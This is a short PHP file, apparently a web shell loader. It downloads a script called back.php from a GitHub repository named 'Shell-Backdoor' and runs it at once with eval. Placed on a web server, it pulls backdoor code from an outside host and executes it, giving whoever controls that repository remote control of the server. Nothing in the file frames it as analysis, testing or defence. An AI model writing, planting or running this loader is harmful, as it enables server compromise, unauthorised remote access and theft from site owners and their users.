<?php
$url = "https://raw.githubusercontent.com/keaneramadhan/Shell-Backdoor/refs/heads/main/back.php"; 
$code = file_get_contents($url);

eval("?>$code<?php");